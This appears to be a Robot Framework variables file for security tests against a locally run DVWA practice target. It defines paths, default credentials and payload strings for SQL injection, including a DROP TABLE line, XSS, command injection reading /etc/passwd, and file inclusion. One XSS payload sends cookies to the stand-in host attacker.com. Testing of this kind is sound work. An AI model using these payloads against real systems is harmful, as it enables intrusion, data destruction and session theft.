*** Variables ***
# DVWA running locally via Docker (docker-compose up)
${BASE_URL}               http://localhost:4280
${USERNAME}               admin
${PASSWORD}               password

# Paths
${SQLI_PATH}              /vulnerabilities/sqli/
${XSS_REFLECTED_PATH}     /vulnerabilities/xss_r/
${XSS_STORED_PATH}        /vulnerabilities/xss_s/
${FILE_UPLOAD_PATH}       /vulnerabilities/upload/
${COMMAND_EXEC_PATH}      /vulnerabilities/exec/
${FILE_INCLUSION_PATH}    /vulnerabilities/fi/
${CSRF_PATH}              /vulnerabilities/csrf/
${UPLOADS_DIR}            /hackable/uploads/

# Timeouts
${MAX_RESPONSE_TIME_SEC}  4    # anything >= 4s flags possible time-based injection

# SQLi payloads
${SQLI_TAUTOLOGY}         1' OR '1'='1
${SQLI_UNION_PASSWD}      ' UNION SELECT null, user() --
${SQLI_TIME_BASED}        1' OR IF(1=1,SLEEP(5),0) --
${SQLI_DROP_TABLE}        '; DROP TABLE users; --
${SQLI_ADMIN_BYPASS}      admin' --
${SQLI_COMMENT}           1' AND 1=1 --

# XSS payloads
${XSS_SCRIPT_TAG}         <script>alert(1)</script>
${XSS_IMG_ONERROR}        <img src=x onerror=alert(1)>
${XSS_SVG}                <svg onload=alert(1)>
${XSS_ATTR_BREAK}         "><script>alert(1)</script>
${XSS_COOKIE_STEAL}       <script>document.location='http://attacker.com?c='+document.cookie</script>

# Command injection payloads
${CMD_SEMICOLON}          127.0.0.1; cat /etc/passwd
${CMD_AND}                127.0.0.1 && id
${CMD_PIPE}               127.0.0.1 | whoami
${CMD_OR}                 127.0.0.1 || id
${CMD_TIME_BASED}         127.0.0.1; sleep 5

# File inclusion payloads
${LFI_PASSWD}             ../../../../etc/passwd
${LFI_ENCODED}            ..%2F..%2F..%2F..%2Fetc%2Fpasswd
${LFI_DOUBLE_SLASH}       ....//....//....//etc/passwd
${LFI_WIN_INI}            ../../../../windows/win.ini
